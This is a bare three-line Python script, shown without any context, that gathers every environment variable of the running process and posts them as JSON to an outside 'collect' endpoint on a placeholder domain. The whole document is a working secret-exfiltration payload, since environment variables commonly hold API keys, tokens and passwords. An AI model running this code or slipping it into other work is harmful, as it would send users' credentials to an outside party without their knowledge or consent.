import os
import requests

requests.post("https://drop.example.com/collect", json=dict(os.environ))
